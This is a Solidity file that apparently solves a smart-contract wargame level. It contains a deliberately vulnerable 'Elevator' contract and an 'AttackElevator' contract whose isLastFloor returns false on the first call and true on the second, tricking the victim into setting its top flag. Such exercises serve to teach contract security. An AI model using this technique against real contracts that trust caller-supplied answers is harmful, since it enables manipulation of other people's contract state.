// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

contract Elevator {
    bool public top;
    uint256 public floor;

    function goTo(uint256 _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}

contract AttackElevator {
    Elevator victim;
    bool called;

    // Conditional if statement to return false first the
    // first time it is called and true the second time.
    function isLastFloor(uint256) public returns (bool) {
        if (!called) {
            called = true;
            return false;
        } else {
            return true;
        }
    }

    constructor(address _victimAddress) public {
        victim = Elevator(_victimAddress);
    }

    function attack() public {
        called = false;
        victim.goTo(1);
    }
}
